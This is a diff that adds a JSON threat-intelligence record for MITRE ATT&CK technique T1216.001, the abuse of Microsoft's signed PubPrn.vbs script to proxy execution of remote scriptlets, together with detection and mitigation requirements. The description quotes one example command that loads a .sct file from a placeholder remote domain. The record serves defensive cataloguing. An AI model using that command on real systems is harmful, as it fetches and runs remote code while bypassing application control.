@@ -1,0 +1,114 @@
+{
+    "id": "T1216.001",
+    "name": "PubPrn",
+    "x_mitre_is_subtechnique": true,
+    "revoked": false,
+    "x_mitre_deprecated": false,
+    "description": "Adversaries may use PubPrn to proxy execution of malicious remote files. PubPrn.vbs is a [Visual Basic](https://attack.mitre.org/techniques/T1059/005) script that publishes a printer to Active Directory Domain Services. The script may be signed by Microsoft and is commonly executed through the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) via <code>Cscript.exe</code>. For example, the following code publishes a printer within the specified domain: <code>cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=Com</code>.(Citation: pubprn)\n\nAdversaries may abuse PubPrn to execute malicious payloads hosted on remote sites.(Citation: Enigma0x3 PubPrn Bypass) To do so, adversaries may set the second <code>script:</code> parameter to reference a scriptlet file (.sct) hosted on a remote site. An example command is <code>pubprn.vbs 127.0.0.1 script:https://mydomain.com/folder/file.sct</code>. This behavior may bypass signature validation restrictions and application control solutions that do not account for abuse of this script.\n\nIn later versions of Windows (10+), <code>PubPrn.vbs</code> has been updated to prevent proxying execution from a remote site. This is done by limiting the protocol specified in the second parameter to <code>LDAP://</code>, vice the <code>script:</code> moniker which could be used to reference remote code via HTTP(S).",
+    "x_mitre_platforms": [
+        "Windows"
+    ],
+    "x_mitre_domains": [
+        "enterprise-attack"
+    ],
+    "x_mitre_defense_bypassed": [
+        "Digital Certificate Validation",
+        "Application Control"
+    ],
+    "external_references": [
+        {
+            "source_name": "mitre-attack",
+            "url": "https://attack.mitre.org/techniques/T1216/001",
+            "external_id": "T1216.001"
+        },
+        {
+            "source_name": "pubprn",
+            "description": "Jason Gerend. (2017, October 16). pubprn. Retrieved July 23, 2021.",
+            "url": "https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/pubprn"
+        },
+        {
+            "source_name": "Enigma0x3 PubPrn Bypass",
+            "description": "Nelson, M. (2017, August 3). WSH INJECTION: A CASE STUDY. Retrieved April 9, 2018.",
+            "url": "https://enigma0x3.net/2017/08/03/wsh-injection-a-case-study/"
+        }
+    ],
+    "kill_chain_phases": [
+        {
+            "kill_chain_name": "mitre-attack",
+            "phase_name": "defense-evasion"
+        }
+    ],
+    "tactic": [
+        "defense-evasion"
+    ],
+    "x_mitre_detection": "Monitor script processes, such as `cscript`, and command-line parameters for scripts like PubPrn.vbs that may be used to proxy execution of malicious files.",
+    "x_mitre_data_sources": [
+        "Script: Script Execution",
+        "Command: Command Execution",
+        "Process: Process Creation"
+    ],
+    "x_mitre_permissions_required": [],
+    "x_mitre_effective_permissions": [],
+    "x_mitre_system_requirements": [],
+    "x_mitre_remote_support": false,
+    "relation": {
+        "mitigates": [
+            {
+                "name": "Execution Prevention",
+                "description": "Block execution of code on a system through application control, and/or script blocking.",
+                "type": "course-of-action",
+                "id": "M1038"
+            },
+            {
+                "name": "Behavior Prevention on Endpoint",
+                "description": "Use capabilities to prevent suspicious behavior patterns from occurring on endpoint systems. This could include suspicious process, file, API call, etc. behavior.",
+                "type": "course-of-action",
+                "id": "M1040"
+            }
+        ]
+    },
+    "mitigationRequirements": {
+        "requirements": [
+            {
+                "description": "Ensure that application whitelisting is configured to prevent the execution of signed scripts (if not required within a given environment).",
+                "acid": "98581675"
+            },
+            {
+                "description": "Ensure that signed scripts are prevented from execution if not required within a given environment.",
+                "acid": "98581676"
+            },
+            {
+                "description": "Ensure that application whitelisting is implemented to block the execution of signed scripts if not required for a system or network.",
+                "acid": "98581677"
+            }
+        ]
+    },
+    "detectionRequirements": {
+        "requirements": [
+            {
+                "description": "Ensure that script processes e.g. cscript is monitored to prevent proxy execution.",
+                "acid": "98581671"
+            },
+            {
+                "description": "Ensure that monitoring solutions are configured to monitor script processes (e.g. cscript) to prevent proxy execution.",
+                "acid": "98581672"
+            },
+            {
+                "description": "Ensure that command-line parameters for scripts e.g. PubPrn.vbs is monitored to prevent proxy execution.",
+                "acid": "98581673"
+            },
+            {
+                "description": "Ensure that monitoring solutions are configured to monitor command-line parameters for scripts (e.g. PubPrn.vbs) to prevent proxy execution.",
+                "acid": "98581674"
+            }
+        ]
+    },
+    "cspcontrolIds": [],
+    "externalcontrolIds": [],
+    "peoplecontrolIds": [],
+    "policycontrolIds": [],
+    "technologycontrolIds": [
+        "11490036"
+    ],
+    "cveIds": []
+}
